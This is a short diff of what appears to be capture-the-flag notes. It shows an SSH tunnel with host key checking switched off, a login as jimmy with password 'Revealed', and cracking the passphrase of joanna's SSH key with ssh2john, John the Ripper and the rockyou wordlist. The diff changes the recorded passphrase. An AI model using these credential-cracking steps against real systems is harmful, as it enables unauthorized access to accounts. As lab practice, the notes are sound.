@@ -97,7 +97,7 @@ ssh -N -L 52846:localhost:52846 -o "UserKnownHostsFile=/dev/null" -o "StrictHost
 
 # login internal web server with jimmy:Revealed and get ssh key
 
-# crack passphase -> bloodninja
+# crack passphase -> bloodninjas
 sh2john joanna_key > joanna_key_crack
 john --wordlist=/usr/share/wordlists/rockyou.txt joanna_key_crack
 
